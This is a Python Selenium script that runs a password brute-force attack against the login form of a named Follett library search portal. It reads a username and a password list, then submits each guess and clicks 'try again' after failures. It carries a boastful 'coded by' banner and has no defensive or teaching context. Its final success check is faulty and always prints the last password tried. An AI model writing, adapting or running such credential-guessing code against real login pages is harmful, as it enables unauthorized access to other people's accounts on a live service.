import selenium
from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.remote.webelement import WebElement

print("Coded by the one and only bulgarian xD")
print("0====(::::::::::::::::::::::::::::>")
print("<::::::::::::::::::::::::::::)====0")
print("0====(::::::::::::::::::::::::::::>")
print("<::::::::::::::::::::::::::::)====0")
print("0====(::::::::::::::::::::::::::::>")
print("<::::::::::::::::::::::::::::)====0")
driver = webdriver.Chrome()
driver.get("https://search.follettsoftware.com/metasearch/ui/3027")
user = input("Enter username:")
passwfile = input("Enter password file name (with extension ex: .txt):")
elem1: WebElement = driver.find_element_by_css_selector(
    "#headerSideBar > mat-sidenav-content > header > "
    "fss-ms-header-std > mat-toolbar > div.rSide > div.rBlock > "
    "div > button")
elem1.click()

with open(passwfile) as f:
    passwfile = list(f)

# the actual shit

line: str
for line in passwfile:
    driver.implicitly_wait(3)
    sel_user = driver.find_element_by_css_selector('#userName')
    sel_user.send_keys(user)
    sel_pass = driver.find_element_by_css_selector('#userPassword')
    sel_pass.send_keys(line)
    login_btn = driver.find_element_by_css_selector("#loginForm > div > div > button.button.primary.material-ripple")
    login_btn.click()
    print("------------------------------")
    print("tried pass:" + line + 'for:' + user)
    print('------------------------------')
    driver.implicitly_wait(1)
    try_again = driver.find_element_by_css_selector(
        'body > div > div > div > div > div > div.col2 > div.go_back_btn > input')
    try_again.click()

if selenium.common.exceptions.NoSuchElementException:
    print(line)
